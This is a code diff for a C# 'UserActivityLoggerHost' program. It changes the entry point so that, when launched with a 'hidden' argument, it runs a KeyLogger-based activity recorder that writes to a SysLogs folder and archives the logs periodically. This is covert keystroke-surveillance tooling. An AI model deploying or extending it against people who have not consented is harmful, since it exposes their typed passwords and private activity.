@@ -12,32 +12,31 @@ namespace Host
 {
     class Program
     {
-        static string _logFolder;
+        static string _localLogFolder;
         static string _archiveLocation;
         static void Main(string[] args)
         {
-
             if (SingleInstance.IsApplicationAlreadyRunning("UserActivityLoggerHost"))
             {
                 return;
             }
 
-          
-            if (true || args.Length > 0 && args[0] == "hidden")
+
+            if (args.Length > 0 && args[0] == "hidden")
             {
-                _logFolder = Path.Combine(GetRootFolderPath(), "SysLogs");
+                _localLogFolder = Path.Combine(GetRootFolderPath(), "SysLogs");
 
                 new UnhandledExceptionHandlercs().Register(ErrrorLogger.LogError);
 
-                new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_logFolder, TimeSpan.FromMinutes(5));
+                new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_localLogFolder, TimeSpan.FromMinutes(5));
 
                 //new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_logFolder, TimeSpan.FromSeconds(5));
 
-                var activityLogger = new ActivityLogger(TimeSpan.FromSeconds(2), _logFolder, new KeyLogger());
+                var activityLogger = new StartUp(TimeSpan.FromSeconds(2), _localLogFolder, new KeyLogger());
 
                 ProcessHelper.Watch();
 
-                activityLogger.StartLoging();
+                activityLogger.Start();
             }
             else
             {
